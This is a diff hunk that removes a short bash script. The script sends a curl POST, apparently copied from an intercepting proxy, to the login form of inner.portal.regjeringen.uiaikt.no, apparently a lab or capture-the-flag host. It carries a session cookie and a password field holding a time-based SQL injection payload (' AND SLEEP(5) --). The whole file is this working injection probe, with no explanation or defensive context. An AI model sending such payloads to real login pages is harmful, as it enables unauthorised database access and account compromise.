@@ -1,6 +1,0 @@
-!!bin/bash
-curl -i -s -k -X $'POST' \
-    -H $'Host: inner.portal.regjeringen.uiaikt.no' -H $'Content-Length: 53' -H $'Cache-Control: max-age=0' -H $'Sec-Ch-Ua: \"Chromium\";v=\"119\", \"Not?A_Brand\";v=\"24\"' -H $'Sec-Ch-Ua-Mobile: ?0' -H $'Sec-Ch-Ua-Platform: \"Windows\"' -H $'Upgrade-Insecure-Requests: 1' -H $'Origin: https://inner.portal.regjeringen.uiaikt.no' -H $'Content-Type: application/x-www-form-urlencoded' -H $'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7' -H $'Sec-Fetch-Site: same-origin' -H $'Sec-Fetch-Mode: navigate' -H $'Sec-Fetch-User: ?1' -H $'Sec-Fetch-Dest: document' -H $'Referer: https://inner.portal.regjeringen.uiaikt.no/login?next=%2F' -H $'Accept-Encoding: gzip, deflate, br' -H $'Accept-Language: en-GB,en-US;q=0.9,en;q=0.8' -H $'Priority: u=0, i' \
-    -b $'session=eyJfZnJlc2giOmZhbHNlfQ.ZVyBKQ.XXM6lI9msZoM6yjcYKBBZAJBgqY' \
-    --data-binary $'username=jonas.dahl&password=1%27+AND+SLEEP%285%29+--' \
-    $'https://inner.portal.regjeringen.uiaikt.no/login'
